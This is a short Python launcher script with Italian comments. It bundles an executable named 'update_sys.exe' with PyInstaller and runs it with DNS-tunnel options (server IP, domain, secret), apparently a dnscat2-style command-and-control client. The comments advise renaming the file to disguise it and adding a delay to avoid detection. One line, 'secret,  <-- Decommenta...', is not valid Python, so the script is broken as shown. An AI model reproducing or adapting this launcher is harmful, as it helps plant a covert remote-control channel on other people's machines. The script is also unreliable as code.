import sys
import os
import subprocess
import time

def resource_path(relative_path):
    """ Ottiene il percorso assoluto delle risorse, funziona sia per dev che per PyInstaller """
    try:
        # PyInstaller crea una cartella temporanea in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def main():
    # 1. Definiamo il nome del file nascosto (puoi rinominarlo per camuffarlo)
    exe_name = "update_sys.exe" 
    exe_path = resource_path(exe_name)

    # 2. Configurazione Parametri (MODIFICA QUESTI CON I TUOI DATI)
    server_ip = "192.168.122.47"
    domain = "test.com"
    secret = "0123456789" # Se usi --security=open sul server, lascia stringa vuota o rimuovi il flag sotto
    
    # 3. Costruzione comando
    # Nota: Se il server è in --security=open, togli --secret
    cmd = [
        exe_path,
        "--dns", f"server={server_ip},domain={domain}",
        "--secret", secret,  <-- Decommenta se usi la cifratura
        #"--delay", "1000"      # Ritardo per non fare troppo rumore (opzionale)
    ]

    print("--- AVVIO PROCESSO NASCOSTO ---")
    print(f"[*] Esecuzione di: {exe_path}")

    try:
        # Esegue l'EXE e attende che finisca. 
        # Se vuoi che giri in background senza console, useremo subprocess.Popen
        subprocess.call(cmd)
    except Exception as e:
        print(f"[!] Errore esecuzione: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()
